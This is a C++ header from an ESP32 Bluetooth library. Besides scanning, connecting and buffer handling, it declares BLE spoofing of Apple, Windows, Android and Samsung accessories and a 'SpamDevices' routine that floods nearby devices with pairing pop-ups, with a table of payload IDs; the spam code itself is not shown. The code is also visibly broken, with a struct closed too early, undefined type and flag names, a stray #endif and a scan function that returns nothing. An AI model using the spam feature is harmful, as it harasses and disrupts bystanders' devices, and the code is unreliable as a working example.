/**
*     _  _         _____                     _______  _ 
*    ( )( (    /| / ___ \ |\     /||\     /|(  ____ \( )
*    | ||  \  ( |( (   ) )( \   / )| )   ( || (    \/| |
*    (_)|   \ | |( (___) | \ (_) / | |   | || (_____ (_)
*     _ | (\ \) | \____  |  ) _ (  | |   | |(_____  ) _ 
*    ( )| | \   |      ) | / ( ) \ | |   | |      ) |( )
*    | || )  \  |/\____) )( /   \ )| (___) |/\____) || |
*    (_)|/    )_)\______/ |/     \|(_______)\_______)(_)
*/
/*  
*  Nyxus Source-Available Non-Derivative License
*  Copyright (c) 2026 Yazdan Samari *
*  Permission is hereby granted, free of charge, to any person obtaining a copy
*  of this software and associated documentation files (the "Software"), to use
*  and compile the Software for personal or internal purposes, subject to the 
*  following conditions: *
*  1. NO MODIFICATION: You may not modify, alter, translate, or create derivative 
*     works of the Software.
*  2. NO REDISTRIBUTION OF MODIFIED COPIES: You may not publish, distribute, 
*     sublicense, or sell modified versions of the Software.
*  3. ATTRIBUTION: The above copyright notice and this permission notice shall be 
*     included in all copies or substantial portions of the Software. *
*  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
*  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
*  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
*  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
*  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
*  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
*  SOFTWARE.
*/
/**
* @file nyx_bluetooth.hpp 
* @brief Provides a static interface for managing Bluetooth devices on ESP32, including scanning, connecting, and maintaining a device list.
* @addtogroup Bluetooth
*/

#pragma once
#ifndef _NYXUS_BLUETOOTH_HPP_
#define _NYXUS_BLUETOOTH_HPP_

#include <Nyxus/nyx_terminal_graphics.hpp>
#include <esp_bt.h>
#include <esp_bt_main.h>
#include <esp_gap_bt_api.h>
#include <esp_gap_ble_api.h>
#include <esp_spp_api.h>
#include <esp_gattc_api.h>
#include <esp_bt_device.h>
#include <esp_bt_defs.h>
#include <nvs_flash.h>
#include <cstdint>
#include <string_view>
#include <cstddef>
#include <utility>
#include <algorithm>
#include <vector>
#include <cstring>
#include <cstdio>
#include <functional>

#ifdef _NYXUS_ENABLE_EXTERNAL_STORAGE_DEVICE_
#include <SdFat.h>
#endif

namespace nyx_bt_flags {
    using btaction_t = uint8_t;
    static inline constexpr btaction_t ACTION_SCAN = 1;
    static inline constexpr btaction_t ACTION_CONNECT = 2;
    static inline constexpr btaction_t ACTION_DISCONNECT = 3;

    using btstate_t = uint8_t;
    static inline constexpr btstate_t STATE_DISCONNECTED = 0;
    static inline constexpr btstate_t STATE_CONNECTING = 1;
    static inline constexpr btstate_t STATE_CONNECTED = 2;

    using btscan_t = uint8_t;
    static inline constexpr btscan_t SCAN_TYPE_CLASSIC = 0x01;
    static inline constexpr btscan_t SCAN_TYPE_GATTC = 0x02;

    using apple_payload_t = uint8_t;
    static inline constexpr apple_payload_t APPLE_AIRPODS = 0x02;
    static inline constexpr apple_payload_t APPLE_AIRPODS_PRO = 0x0E;
    static inline constexpr apple_payload_t APPLE_AIRPODS_MAX = 0x0A;
    static inline constexpr apple_payload_t APPLE_AIRPODS_GEN2 = 0x0F;
    static inline constexpr apple_payload_t APPLE_AIRPODS_GEN3 = 0x13;
    static inline constexpr apple_payload_t APPLE_AIRPODS_PRO_GEN2 = 0x14;
    static inline constexpr apple_payload_t APPLE_POWERBEATS = 0x0B;
    static inline constexpr apple_payload_t APPLE_POWERBEATS_PRO = 0x0C;
    static inline constexpr apple_payload_t APPLE_BEATS_SOLO_PRO = 0x10;
    static inline constexpr apple_payload_t APPLE_BEATS_STUDIO_BUDS = 0x11;
    static inline constexpr apple_payload_t APPLE_BEATS_FLEX = 0x12;
    static inline constexpr apple_payload_t APPLE_BEATS_FIT_PRO = 0x12;
    static inline constexpr apple_payload_t APPLE_BEATS_STUDIO_PRO = 0x17;
    static inline constexpr apple_payload_t APPLE_APPLE_TV = 0x09;

    using win_payload_t = uint8_t;
    static inline constexpr win_payload_t WINDOWS_SWIFT_PAIR = 0x03;

    using android_payload_t = uint32_t;
    static inline constexpr android_payload_t ANDROID_PIXEL_BUDS      = 0x718F23;
    static inline constexpr android_payload_t ANDROID_PIXEL_BUDS_A    = 0x2B677D;
    static inline constexpr android_payload_t ANDROID_PIXEL_BUDS_PRO  = 0x5158EE;
    static inline constexpr android_payload_t ANDROID_JBL_LIVE_300    = 0x310D66;
    static inline constexpr android_payload_t ANDROID_SONY_XM4        = 0x0D09B6;

    using samsung_payload_t = uint16_t;
    static inline constexpr samsung_payload_t SAMSUNG_GALAXY_BUDS_LIVE = 0x0105;
    static inline constexpr samsung_payload_t SAMSUNG_GALAXY_BUDS_PRO  = 0x0106;
    static inline constexpr samsung_payload_t SAMSUNG_GALAXY_SMART_TAG = 0x0107;
    static inline constexpr samsung_payload_t SAMSUNG_GALAXY_BUDS_2    = 0x0109;

    using spam_target_t = uint8_t;
    static inline constexpr spam_target_t SPAM_TARGET_APPLE   = 1 << 0; // 0x01
    static inline constexpr spam_target_t SPAM_TARGET_WINDOWS = 1 << 1; // 0x02
    static inline constexpr spam_target_t SPAM_TARGET_ANDROID = 1 << 2; // 0x04
    static inline constexpr spam_target_t SPAM_TARGET_SAMSUNG = 1 << 3; // 0x08
    static inline constexpr spam_target_t SPAM_TARGET_ALL     = 0x0F;
}

/**
* @class NYXUS_BLUETOOTH
* @brief Bluetooth device manager for ESP32. Provides a static interface for scanning, connecting, and managing Bluetooth devices.
* @tparam N The maximum number of devices to manage in the internal device list.
* @tparam _BUFSIZE The buffer size for internal operations.
* @tparam MAX_NAME_LEN The maximum length of the device name string.
* @tparam MAX_PASSWORD_LENGTH The maximum length of the device password string.
* @tparam ENABLE_CLASSIC Whether to enable classic Bluetooth support.
* @tparam ENABLE_BLE Whether to enable BLE support.
*/
template <uint8_t N, size_t _BUFSIZE = UINT8_MAX, uint8_t MAX_NAME_LEN = UINT8_MAX, uint8_t MAX_PASSWORD_LENGTH = UINT8_MAX, bool ENABLE_CLASSIC = true, bool ENABLE_BLE = true>
class NYXUS_BLUETOOTH {

    protected:    
    template <size_t __BUFSIZE = _BUFSIZE, size_t MAX_ADDRESS_LEN = 18>
    struct BluetoothDevice {
        public:
        /**
        * @brief Path for external storage logging
        */
        const char* path{};

        public:
        /**
        * @brief Array of buffers (RX and TX)
        */
        char** buffers{};

        public:
        /**
        * @brief Connection handle (SPP or GATTC)
        */
        uint32_t handle{};

        public:
        /**
        * @brief Flag to enable logging for this device
        */
        bool ENABLE_LOG{};

        public:
        /**
        * @brief Flag indicating if the device is a BLE device
        */
        bool is_ble{};
    };

        public:
        /**
        * @brief The current connection state of the device
        */
        nyx_bt_flags::conn_state_t state{nyx_bt_flags::STATE_DISCONNECTED};

        public:
        /**
        * @brief The MAC address of the device
        */
        char address[MAX_ADDRESS_LEN]{};

        public:
        /**
        * @brief The binary representation of the MAC address
        */
        esp_bd_addr_t bda{};

        public:
        /**
        * @brief The name of the device
        */
        char name[MAX_NAME_LEN]{};

        public:
        /**
        * @brief The password or PIN for the device
        */
        char password[MAX_PASSWORD_LENGTH]{};

        public:
        /**
        * @brief Constructor for initializing the BluetoothDevice
        */
        BluetoothDevice(std::string_view name_, std::string_view password_, std::string_view address_) {
            buffers = new char*[2];
            buffers[0] = new char[__BUFSIZE]();
            buffers[1] = new char[__BUFSIZE]();
            
            size_t name_len = std::min(name_.size(), (size_t)MAX_NAME_LEN - 1);
            for (size_t i = 0; i < name_len; ++i) this->name[i] = name_[i];
            this->name[name_len] = '\0';
            
            size_t pass_len = std::min(password_.size(), (size_t)MAX_PASSWORD_LENGTH - 1);
            for (size_t i = 0; i < pass_len; ++i) this->password[i] = password_[i];
            this->password[pass_len] = '\0';
            
            size_t addr_len = std::min(address_.size(), (size_t)MAX_ADDRESS_LEN - 1);
            for (size_t i = 0; i < addr_len; ++i) this->address[i] = address_[i];
            this->address[addr_len] = '\0';

            NYXUS_BLUETOOTH::str2bda(this->address, this->bda);
        }
        
        public:
        /**
        * @brief Destructor to clean up buffers
        */
        ~BluetoothDevice() {
            if (buffers) {
                delete[] buffers[0];
                delete[] buffers[1];
                delete[] buffers;
                buffers = nullptr;
            }
        }

        public:
        /**
        * @brief Move constructor
        */
        BluetoothDevice(BluetoothDevice&& other) noexcept {
            path = other.path;
            buffers = other.buffers;
            handle = other.handle;
            ENABLE_LOG = other.ENABLE_LOG;
            is_ble = other.is_ble;
            state = other.state;
            std::memcpy(address, other.address, MAX_ADDRESS_LEN);
            std::memcpy(bda, other.bda, 6);
            std::memcpy(name, other.name, MAX_NAME_LEN);
            std::memcpy(password, other.password, MAX_PASSWORD_LENGTH);

            other.buffers = nullptr;
        }

        public:
        /**
        * @brief Move assignment operator
        */
        BluetoothDevice& operator=(BluetoothDevice&& other) noexcept {
            if (this != &other) {
                if (buffers) {
                    delete[] buffers[0];
                    delete[] buffers[1];
                    delete[] buffers;
                }
                path = other.path;
                buffers = other.buffers;
                handle = other.handle;
                ENABLE_LOG = other.ENABLE_LOG;
                is_ble = other.is_ble;
                state = other.state;
                std::memcpy(address, other.address, MAX_ADDRESS_LEN);
                std::memcpy(bda, other.bda, 6);
                std::memcpy(name, other.name, MAX_NAME_LEN);
                std::memcpy(password, other.password, MAX_PASSWORD_LENGTH);
                other.buffers = nullptr;
            }
            return *this;
        }
        
        public:
        BluetoothDevice(const BluetoothDevice&) = delete;
        public:
        BluetoothDevice& operator=(const BluetoothDevice&) = delete;
    };
    
    protected:
    /**
    * @brief The name that ESP32 will appear as
    */
    char device_name[MAX_NAME_LEN]{};

    protected:
    /**
    * @brief The password required for pairing
    */
    char device_password[MAX_PASSWORD_LENGTH]{};

    protected:
    /**
    * @brief The registered GATT Client Interface ID
    */
    uint8_t current_gattc_if{ESP_GATT_IF_NONE};

    public:
    /**
    * @brief List of managed Bluetooth devices
    */
    std::vector<BluetoothDevice<_BUFSIZE>> device_list{};

    protected:
    /**
    * @brief Handle for the FreeRTOS spamming task
    */
    TaskHandle_t spam_task_handle = nullptr;

    protected:
    /**
    * @brief Delay between spam payloads (in ms)
    */
    uint32_t spam_delay_ms = 50;

    protected:
    /**
    * @brief Tracks whether the spam task is actively running
    */
    bool is_spamming = false;

    protected:
    /**
    * @brief The FreeRTOS task loop for cycling through Apple BLE payloads
    */
    static void spam_task(void* arg);

    protected:
    /**
    * @brief Tracks which platforms are currently being targeted by the spam task
    */
    nyx_bt_flags::spam_target_t current_spam_target = nyx_bt_flags::SPAM_TARGET_ALL;

    /**
    * @brief Index for the RX buffer
    */
    static constexpr uint8_t RX = 0x01;

    protected:
    /**
    * @brief Index for the TX buffer
    */
    static constexpr uint8_t TX = 0x00;

    protected:
    /**
    * @brief Singleton pointer for ESP-IDF callbacks
    */
    static NYXUS_BLUETOOTH* instance_ptr;

    public:
    /**
    * @brief Constructor for the NYXUS_BLUETOOTH manager
    * @param name_ The device name
    * @param password_ The device password
    */
    NYXUS_BLUETOOTH(std::string_view name_, std::string_view password_ = "") {
        size_t name_len = std::min(name_.size(), (size_t)MAX_NAME_LEN - 1);
        for (size_t i = 0; i < name_len; ++i) device_name[i] = name_[i];
        device_name[name_len] = '\0';
        size_t pass_len = std::min(password_.size(), (size_t)MAX_PASSWORD_LENGTH - 1);
        for (size_t i = 0; i < pass_len; ++i) device_password[i] = password_[i];
        device_password[pass_len] = '\0';
        device_list.reserve(N);
        instance_ptr = this;
    }

    public:
    /**
    * @brief Destructor for NYXUS_BLUETOOTH
    */
    ~NYXUS_BLUETOOTH() {
        if (instance_ptr == this) {
            instance_ptr = nullptr;
        }
    }

    public:
    /**
    * @brief Initializes the ESP32 Bluetooth controller, Bluedroid stack, and registers callbacks.
    */
    inline void Kickstart();

    public:
    /**
    * @brief Scans for nearby Bluetooth devices (Classic and/or BLE depending on flags).
    * @param scan_type Uses nyx_bt_flags (e.g. SCAN_TYPE_SPP, SCAN_TYPE_GATTC).
    * @return A vector containing pairs of device names and addresses.
    */
    [[nodiscard]] inline std::vector<std::pair<char*, char*>> ScanDevices(nyx_bt_flags::btscan_t scan_type = nyx_bt_flags::SCAN_TYPE_BOTH);

    public:
    /**
    * @brief Attempts to connect to a specific Bluetooth device by MAC address.
    * @param address The MAC address of the target device.
    * @param password Optional password/PIN for pairing.
    * @param is_ble_device True if connecting via BLE (GATTC) instead of Classic (SPP).
    * @return True if connection process started successfully, false otherwise.
    */
    [[nodiscard]] inline bool ConnectToDevice(const char* __restrict address, const char* __restrict password = "", bool is_ble_device = false);

    public:
    /**
    * @brief Disconnects from a currently connected Bluetooth device.
    * @param address The MAC address of the device to disconnect.
    */
    inline void DisconnectDevice(const char* __restrict address);
    
    public:
    /**
    * @brief Prints a detailed list of currently connected devices.
    */
    inline void ListConnectedDevices() const;

    public:
    /**
    * @brief Disconnects and removes all devices from the active device list.
    */
    inline void ClearDeviceList();

    public:
    /**
    * @brief Updates the device's visible Bluetooth name.
    * @param name_ The new name for the ESP32.
    */
    inline void SetDeviceName(std::string_view name_);

    public:
    /**
    * @brief Updates the default pairing password/PIN for the ESP32.
    * @param password_ The new password.
    */
    inline void SetDevicePassword(std::string_view password_);

    public:
    /**
    * @brief Writes data to the transmission (TX) buffer of a specific device.
    * @param address The MAC address of the destination device.
    * @param data Pointer to the data payload.
    * @param length Size of the data in bytes.
    * @return True if write was successful, false if device not found.
    */
    [[nodiscard]] inline bool WriteToDeviceBufferTX(const char* __restrict address, const char* __restrict data, size_t length);

    public:
    /**
    * @brief Reads data from the reception (RX) buffer of a specific device.
    * @param address The MAC address of the source device.
    * @param buffer Pointer to the destination buffer.
    * @param length Maximum number of bytes to read.
    * @return True if read was successful, false if device not found.
    */
    [[nodiscard]] inline bool ReadFromDeviceBufferRX(const char* __restrict address, char* __restrict buffer, size_t length);

    public:
    /**
    * @brief Checks if a given device is currently connected.
    * @param address The MAC address to check.
    * @return True if connected, false otherwise.
    */
    [[nodiscard]] inline bool IsDeviceConnected(const char* __restrict address) const;

    public:
    /**
    * @brief Gets the total number of connected devices.
    * @return The count of connected devices.
    */
    [[nodiscard]] inline size_t GetConnectedDeviceCount() const;

    public:
    /**
    * @brief Checks if a device exists in the managed device list (regardless of connection state).
    * @param address The MAC address to check.
    * @return True if the device is in the list, false otherwise.
    */
    [[nodiscard]] inline bool HasDevice(const char* __restrict address) const;

    public:
    /**
    * @brief Broadcasts a message to all connected devices.
    * @param data Pointer to the data payload.
    * @param length Size of the data in bytes.
    */
    inline void BroadcastToAll(const char* __restrict data, size_t length);

    public:
    /**
    * @brief Controls the discoverability of the ESP32 via GAP.
    * @param enable True to make the device discoverable, false to hide it.
    */
    inline void SetDiscoverability(bool enable);


    #ifdef _NYXUS_ENABLE_EXTERNAL_STORAGE_DEVICE_

    public:
    /**
    * @brief Saves the current device list metadata to external storage.
    * @param path The path of the file to save to.
    * @return True on success, false on failure.
    */
    [[nodiscard]] inline bool SaveDeviceListToStorage(const char* __restrict path);

    public:
    /**
    * @brief Loads a saved device list from external storage.
    * @param path The path of the file to load from.
    * @return True on success, false on failure.
    */
    [[nodiscard]] inline bool LoadDeviceListFromStorage(const char* __restrict path);

    public:
    /**
    * @brief Removes a specific device's entry from the stored file.
    * @param address The MAC address to remove.
    * @param filename The path of the file.
    * @return True on success, false on failure.
    */
    [[nodiscard]] inline bool RemoveDeviceFromStorage(const char* __restrict address, const char* __restrict filename);

    public:
    /**
    * @brief Clears the entire file and removes all devices.
    * @param filename The path of the file.
    * @return True on success, false on failure.
    */
    [[nodiscard]] inline bool ClearDeviceListFromStorage(const char* __restrict filename);
    
    #endif

    public:
    /**
    * @brief Spoofs an Apple Device via BLE Proximity Pairing packets
    * @param device The target Apple device enum to spoof
    * @param enable Start (true) or Stop (false) the spoofing transmission
    */
    inline void SpoofAppleDevice(nyx_bt_flags::apple_payload_t device, bool enable = true);

    public:
    /**
    * @brief Spoofs a Windows Swift Pair peripheral via BLE
    */
    inline void SpoofWindowsDevice(bool enable = true);

    public:
    /**
    * @brief Spoofs an Android Fast Pair device (Service UUID 0xFE2C)
    */
    inline void SpoofAndroidDevice(nyx_bt_flags::android_payload_t device, bool enable = true);

    public:
    /**
    * @brief Spoofs a Samsung Galaxy device (Company ID 0x0075)
    */
    inline void SpoofSamsungDevice(nyx_bt_flags::samsung_payload_t device, bool enable = true);

    public:
    /**
    * @brief Rapidly cycles through BLE payloads to trigger pop-ups on selected platforms
    * @param target Bitmask of platforms to target (e.g. SPAM_TARGET_APPLE | SPAM_TARGET_WINDOWS). Defaults to ALL.
    * @param enable Start (true) or Stop (false) the spamming sequence
    * @param delay_ms Delay between switching payloads (in milliseconds)
    */
    inline void SpamDevices(nyx_bt_flags::spam_target_t target = nyx_bt_flags::SPAM_TARGET_ALL, bool enable = true, uint32_t delay_ms = 100);

    protected:
    /**
    * @brief Enables RX/TX buffer logging to a specified folder on storage.
    * @param address The MAC address of the device to log.
    * @param folder The folder path to store log files.
    * @return True on success, false on failure.
    */
    [[nodiscard]] inline bool LogDviceBuffers(const char* __restrict address, const char* __restrict folder);

    #endif

    protected:
    /**
    * @brief Callback for Classic Bluetooth SPP events
    */
    static void spp_callback(esp_spp_cb_event_t event, esp_spp_cb_param_t *param);
    
    protected:
    /**
    * @brief Callback for Generic Access Profile (GAP) events
    */
    static void gap_callback(esp_bt_gap_cb_event_t event, esp_bt_gap_cb_param_t *param);
    
    protected:
    /**
    * @brief Callback for Bluetooth Low Energy GATTC events
    */
    static void gattc_callback(esp_gattc_cb_event_t event, esp_gatt_if_t gattc_if, esp_ble_gattc_cb_param_t *param);

    protected:
    /**
    * @brief Finds a device instance by its string MAC address
    */
    inline BluetoothDevice<_BUFSIZE>* find_device(const char* __restrict address);
    
    protected:
    /**
    * @brief Finds a device instance by its string MAC address (const)
    */
    inline const BluetoothDevice<_BUFSIZE>* find_device(const char* __restrict address) const;

    protected:
    /**
    * @brief Finds a device instance by its binary MAC address
    */
    inline BluetoothDevice<_BUFSIZE>* find_device_bda(esp_bd_addr_t bda);

    public:
    /**
    * @brief Fast conversion of string MAC address to binary esp_bd_addr_t
    */
    static void str2bda(const char* __restrict str, esp_bd_addr_t bda);
    
    public:
    /**
    * @brief Fast conversion of binary esp_bd_addr_t to string MAC address
    */
    static void bda2str(esp_bd_addr_t bda, char* __restrict str, size_t size);
};

template <uint8_t N, size_t _BUFSIZE, uint8_t MAX_NAME_LEN, uint8_t MAX_PASSWORD_LENGTH, bool ENABLE_CLASSIC, bool ENABLE_BLE>
NYXUS_BLUETOOTH<N, _BUFSIZE, MAX_NAME_LEN, MAX_PASSWORD_LENGTH, ENABLE_CLASSIC, ENABLE_BLE>* NYXUS_BLUETOOTH<N, _BUFSIZE, MAX_NAME_LEN, MAX_PASSWORD_LENGTH, ENABLE_CLASSIC, ENABLE_BLE>::instance_ptr = nullptr;

// =========================================================================================
// IMPLEMENTATIONS
// =========================================================================================

template <uint8_t N, size_t _BUFSIZE, uint8_t MAX_NAME_LEN, uint8_t MAX_PASSWORD_LENGTH, bool ENABLE_CLASSIC, bool ENABLE_BLE>
inline void NYXUS_BLUETOOTH<N, _BUFSIZE, MAX_NAME_LEN, MAX_PASSWORD_LENGTH, ENABLE_CLASSIC, ENABLE_BLE>::str2bda(const char* __restrict str, esp_bd_addr_t bda) {
    if (!str) return;
    for (int i = 0; i < 6; i++) {
        bda[i] = 0;
        for (int j = 0; j < 2; j++) {
            char c = str[i * 3 + j];
            uint8_t val = (c >= '0' && c <= '9') ? (c - '0') : ((c | 0x20) - 'a' + 10);
            bda[i] = (bda[i] << 4) | val;
        }
    }
}

template <uint8_t N, size_t _BUFSIZE, uint8_t MAX_NAME_LEN, uint8_t MAX_PASSWORD_LENGTH, bool ENABLE_CLASSIC, bool ENABLE_BLE>
inline void NYXUS_BLUETOOTH<N, _BUFSIZE, MAX_NAME_LEN, MAX_PASSWORD_LENGTH, ENABLE_CLASSIC, ENABLE_BLE>::bda2str(esp_bd_addr_t bda, char* __restrict str, size_t size) {
    if (str == nullptr || size < 18) [[unlikely]] return;
    static const char hex[] = "0123456789abcdef";
    for (int i = 0; i < 6; i++) {
        str[i * 3] = hex[bda[i] >> 4];
        str[i * 3 + 1] = hex[bda[i] & 0x0F];
        if (i < 5) str[i * 3 + 2] = ':';
    }
    str[17] = '\0';
}

template <uint8_t N, size_t _BUFSIZE, uint8_t MAX_NAME_LEN, uint8_t MAX_PASSWORD_LENGTH, bool ENABLE_CLASSIC, bool ENABLE_BLE>
inline auto NYXUS_BLUETOOTH<N, _BUFSIZE, MAX_NAME_LEN, MAX_PASSWORD_LENGTH, ENABLE_CLASSIC, ENABLE_BLE>::find_device(const char* __restrict address) -> BluetoothDevice<_BUFSIZE>* {
    esp_bd_addr_t target_bda;
    str2bda(address, target_bda);
    for (auto& dev : device_list) {
        if (std::memcmp(dev.bda, target_bda, 6) == 0) [[unlikely]] return &dev;
    }
    return nullptr;
}

template <uint8_t N, size_t _BUFSIZE, uint8_t MAX_NAME_LEN, uint8_t MAX_PASSWORD_LENGTH, bool ENABLE_CLASSIC, bool ENABLE_BLE>
inline auto NYXUS_BLUETOOTH<N, _BUFSIZE, MAX_NAME_LEN, MAX_PASSWORD_LENGTH, ENABLE_CLASSIC, ENABLE_BLE>::find_device(const char* __restrict address) const -> const BluetoothDevice<_BUFSIZE>* {
    esp_bd_addr_t target_bda;
    str2bda(address, target_bda);
    for (const auto& dev : device_list) {
        if (std::memcmp(dev.bda, target_bda, 6) == 0) [[unlikely]] return &dev;
    }
    return nullptr;
}

template <uint8_t N, size_t _BUFSIZE, uint8_t MAX_NAME_LEN, uint8_t MAX_PASSWORD_LENGTH, bool ENABLE_CLASSIC, bool ENABLE_BLE>
inline auto NYXUS_BLUETOOTH<N, _BUFSIZE, MAX_NAME_LEN, MAX_PASSWORD_LENGTH, ENABLE_CLASSIC, ENABLE_BLE>::find_device_bda(esp_bd_addr_t bda) -> BluetoothDevice<_BUFSIZE>* {
    for (auto& dev : device_list) {
        if (std::memcmp(dev.bda, bda, 6) == 0) [[unlikely]] return &dev;
    }
    return nullptr;
}

template <uint8_t N, size_t _BUFSIZE, uint8_t MAX_NAME_LEN, uint8_t MAX_PASSWORD_LENGTH, bool ENABLE_CLASSIC, bool ENABLE_BLE>
inline void NYXUS_BLUETOOTH<N, _BUFSIZE, MAX_NAME_LEN, MAX_PASSWORD_LENGTH, ENABLE_CLASSIC, ENABLE_BLE>::Kickstart() {
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) [[unlikely]] {
        nvs_flash_erase();
        nvs_flash_init();
    }
    
    esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
    esp_bt_controller_init(&bt_cfg);
    
    if constexpr (ENABLE_CLASSIC && ENABLE_BLE) {
        esp_bt_controller_enable(ESP_BT_MODE_BTDM);
    } else if constexpr (ENABLE_CLASSIC) {
        esp_bt_controller_enable(ESP_BT_MODE_CLASSIC_BT);
    } else if constexpr (ENABLE_BLE) {
        esp_bt_controller_enable(ESP_BT_MODE_BLE);
    }
    
    esp_bluedroid_init();
    esp_bluedroid_enable();
    
    if constexpr (ENABLE_CLASSIC) {
        esp_bt_gap_register_callback(NYXUS_BLUETOOTH::gap_callback);
        esp_spp_register_callback(NYXUS_BLUETOOTH::spp_callback);
        esp_spp_init(ESP_SPP_MODE_CB);
    }
    
    if constexpr (ENABLE_BLE) {
        esp_ble_gattc_register_callback(NYXUS_BLUETOOTH::gattc_callback);
        esp_ble_gattc_app_register(0); // Application ID
    }
    
    esp_bt_dev_set_device_name(device_name);
}

template <uint8_t N, size_t _BUFSIZE, uint8_t MAX_NAME_LEN, uint8_t MAX_PASSWORD_LENGTH, bool ENABLE_CLASSIC, bool ENABLE_BLE>
inline void NYXUS_BLUETOOTH<N, _BUFSIZE, MAX_NAME_LEN, MAX_PASSWORD_LENGTH, ENABLE_CLASSIC, ENABLE_BLE>::spp_callback(esp_spp_cb_event_t event, esp_spp_cb_param_t *param) {
    if (!instance_ptr) [[unlikely]] return;
    switch (event) {
        case ESP_SPP_INIT_EVT:
            break;
        case ESP_SPP_DISCOVERY_COMP_EVT:
            break;
        case ESP_SPP_OPEN_EVT: {
            auto* dev = instance_ptr->find_device_bda(param->open.rem_bda);
            if (dev) [[likely]] {
                dev->state = nyx_bt_flags::STATE_CONNECTED;
                dev->handle = param->open.handle;
            }
            break;
        }
        case ESP_SPP_CLOSE_EVT: {
            for (auto& dev : instance_ptr->device_list) {
                if (dev.handle == param->close.handle) [[unlikely]] {
                    dev.state = nyx_bt_flags::STATE_DISCONNECTED;
                    dev.handle = 0;
                    break;
                }
            }
            break;
        }
        case ESP_SPP_DATA_IND_EVT: {
            for (auto& dev : instance_ptr->device_list) {
                if (dev.handle == param->data_ind.handle) [[unlikely]] {
                    size_t len = std::min((size_t)param->data_ind.len, _BUFSIZE - 1);
                    std::memcpy(dev.buffers[RX], param->data_ind.data, len);
                    dev.buffers[RX][len] = '\0';
                    break;
                }
            }
            break;
        }
        default:
            break;
    }
}

template <uint8_t N, size_t _BUFSIZE, uint8_t MAX_NAME_LEN, uint8_t MAX_PASSWORD_LENGTH, bool ENABLE_CLASSIC, bool ENABLE_BLE>
inline void NYXUS_BLUETOOTH<N, _BUFSIZE, MAX_NAME_LEN, MAX_PASSWORD_LENGTH, ENABLE_CLASSIC, ENABLE_BLE>::gap_callback(esp_bt_gap_cb_event_t event, esp_bt_gap_cb_param_t *param) {
    if (!instance_ptr) [[unlikely]] return;
    switch (event) {
        case ESP_BT_GAP_DISC_RES_EVT:
            break;
        case ESP_BT_GAP_DISC_STATE_CHANGED_EVT:
            break;
        default:
            break;
    }
}

template <uint8_t N, size_t _BUFSIZE, uint8_t MAX_NAME_LEN, uint8_t MAX_PASSWORD_LENGTH, bool ENABLE_CLASSIC, bool ENABLE_BLE>
inline void NYXUS_BLUETOOTH<N, _BUFSIZE, MAX_NAME_LEN, MAX_PASSWORD_LENGTH, ENABLE_CLASSIC, ENABLE_BLE>::gattc_callback(esp_gattc_cb_event_t event, esp_gatt_if_t gattc_if, esp_ble_gattc_cb_param_t *param) {
    if (!instance_ptr) [[unlikely]] return;

    if (event == ESP_GATTC_REG_EVT) {
        if (param->reg.status == ESP_GATT_OK) {
            instance_ptr->current_gattc_if = gattc_if;
        }
        return;
    }

    switch(event) {
        case ESP_GATTC_CONNECT_EVT: {
            auto* dev = instance_ptr->find_device_bda(param->connect.remote_bda);
            if (dev) [[likely]] {
                dev->state = nyx_bt_flags::STATE_CONNECTED;
                dev->handle = param->connect.conn_id;
            }
            break;
        }
        case ESP_GATTC_DISCONNECT_EVT: {
            for (auto& dev : instance_ptr->device_list) {
                if (dev.handle == param->disconnect.conn_id && dev.is_ble) [[unlikely]] {
                    dev.state = nyx_bt_flags::STATE_DISCONNECTED;
                    dev.handle = 0;
                    break;
                }
            }
            break;
        }
        case ESP_GATTC_NOTIFY_EVT: {
            for (auto& dev : instance_ptr->device_list) {
                if (dev.handle == param->notify.conn_id && dev.is_ble) [[unlikely]] {
                    size_t len = std::min((size_t)param->notify.value_len, _BUFSIZE - 1);
                    std::memcpy(dev.buffers[RX], param->notify.value, len);
                    dev.buffers[RX][len] = '\0';
                    break;
                }
            }
            break;
        }
        default:
            break;
    }
}

template <uint8_t N, size_t _BUFSIZE, uint8_t MAX_NAME_LEN, uint8_t MAX_PASSWORD_LENGTH, bool ENABLE_CLASSIC, bool ENABLE_BLE>
inline std::vector<std::pair<char*, char*>> NYXUS_BLUETOOTH<N, _BUFSIZE, MAX_NAME_LEN, MAX_PASSWORD_LENGTH, ENABLE_CLASSIC, ENABLE_BLE>::ScanDevices(nyx_bt_flags::btscan_t scan_type) {
    std::vector<std::pair<char*, char*>> results;
    if constexpr (ENABLE_CLASSIC) {
        if (scan_type & nyx_bt_flags::SCAN_TYPE_SPP) {
            esp_bt_gap_start_discovery(ESP_BT_INQ_MODE_GENERAL_INQUIRY, 10, 0);
        }
    }
    if constexpr (ENABLE_BLE) {
        if (scan_type & nyx_bt_flags::SCAN_TYPE_GATTC) {
            static esp_ble_scan_params_t ble_scan_params = {
                .scan_type              = BLE_SCAN_TYPE_ACTIVE,
                .own_addr_type          = BLE_ADDR_TYPE_PUBLIC,
                .scan_filter_policy     = BLE_SCAN_FILTER_ALLOW_ALL,
                .scan_interval          = 0x50,
                .scan_window            = 0x30,
                .scan_duplicate         = BLE_SCAN_DUPLICATE_DISABLE
            };
            esp_ble_gap_set_scan_params(&ble_scan_params);
            esp_ble_gap_start_scanning(10);
        }
    }
    return results;
}

template <uint8_t N, size_t _BUFSIZE, uint8_t MAX_NAME_LEN, uint8_t MAX_PASSWORD_LENGTH, bool ENABLE_CLASSIC, bool ENABLE_BLE>
inline bool NYXUS_BLUETOOTH<N, _BUFSIZE, MAX_NAME_LEN, MAX_PASSWORD_LENGTH, ENABLE_CLASSIC, ENABLE_BLE>::ConnectToDevice(const char* __restrict address, const char* __restrict password, bool is_ble_device) {
    if (device_list.size() >= N) [[unlikely]] return false;
    
    device_list.emplace_back("Unknown", password, address);
    auto& dev = device_list.back();
    dev.state = nyx_bt_flags::STATE_CONNECTING;
    dev.is_ble = is_ble_device;

    if constexpr (ENABLE_CLASSIC) {
        if (!is_ble_device) {
